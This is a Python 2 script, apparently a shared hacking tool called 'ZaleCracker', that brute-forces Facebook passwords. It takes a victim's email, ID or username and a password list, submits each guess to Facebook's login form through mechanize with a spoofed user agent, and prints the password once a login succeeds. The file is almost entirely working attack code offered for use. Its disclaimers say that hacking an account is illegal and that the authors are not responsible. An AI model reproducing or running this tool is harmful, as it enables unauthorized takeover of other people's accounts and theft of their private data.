#!usr/bin/python
#ZaleCracker contourne les parefeux 100% efficace
#Pirater un compte facebook est illegal
#ZaleHack n'est pas responsable de vos actes


import sys
import random
import mechanize
import cookielib

GHT = '''
                                              +===========================================+ 
                                              |................Tiger6117..................| 
                                              +-------------------------------------------+
                                              |Facebook: www.facebook.com/Tiger6117       |
                                              |Visit my site/blog For new Stuff/methods :p| 
                                              |Site: http://tigerzplace.tk                | 
                                              |Blog: http://softwarezcity.blogspot.com    |                                                        
                                              |Je ne suis pas responsable de vos actes    | 
                                              |                                           |  
                                              +===========================================+ 
                                              |...........My silent`iZ mY poWer...........| 
                                              +-------------------------------------------+ 
'''
	
print		                                                      "                                     .::!!!!!!!:.     #Tig3r`Bh4i"
print		                                                      "  .!!!!!:.                        .:!!!!!!!!!!!!      #www.facebook.com/Tiger6117"
print		                                                      "  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$      #My Silence`iZ my Power"
print		                                                      "      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P "
print		                                                      "      $$$$$##WX!:      .<!!!!UW$$$$   $$$$$$$$# "
print		                                                      "      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$* "    
print		                                                      "      ^$$$B  $$$$      $$$$$$$$$$$$   d$$R* "
print		                                                      "        **$bd$$$$      '*$$$$$$$$$$$o+#  "
print		                                                      "             ****          ******* "          

print "Note : Real Progammer is Zale Hacker"
print "# You can Get victim ID from using www.graph.facebook.com/victim_user_name"


email = str(raw_input("# Entrer |Email| |Number| |ID | |User Name| : "))
passwordlist = str(raw_input("Enter Pass list path or Copy pass list : "))

useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]


# define variable 
__programmer__ 	= "Tiger6117"
__version__    	= "9.0"
verbose 	= False
useproxy	= False
usepassproxy	= False
log		= 'fbbruteforcer.log'
file		= open(log, "a")
login = 'https://www.facebook.com/login.php?login_attempt=1'
def attack(password):

  try:
     sys.stdout.write("\r[*] trying %s.. " % password)
     sys.stdout.flush()
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
     br.select_form(nr=0)

      
     ##Facebook
     br.form['email'] =email
     br.form['pass'] = password
     br.submit()
     log = br.geturl()
     if log != login:
        print "\n\n\n [*] Password Cracked .. !!"
        print "\n [*] This is the Password : %s\n" % (password)
        sys.exit(1)
  except KeyboardInterrupt:
        print "\n[*] Exiting program .. "
        sys.exit(1)

def search():
    global password
    for password in passwords:
        attack(password.replace("\n",""))



def check():

    global br
    global passwords
    try:
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
       print "\n[*] Exiting program ..\n"
       sys.exit(1)
    try:
       list = open(passwordlist, "r")
       passwords = list.readlines()
       k = 0
       while k < len(passwords):
          passwords[k] = passwords[k].strip()
          k += 1
    except IOError:
        print "\n [*] Error: check your password list path \n"
        sys.exit(1)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
    try:
        print GHT
        print " [*] Target Victim : %s" % (email)
        print " [*] No.Passwords :" , len(passwords), "passwords"
        print " [*] Cracking, wait ..."
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
    try:
        search()
        attack(password)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)

if __name__ == '__main__':
    check()
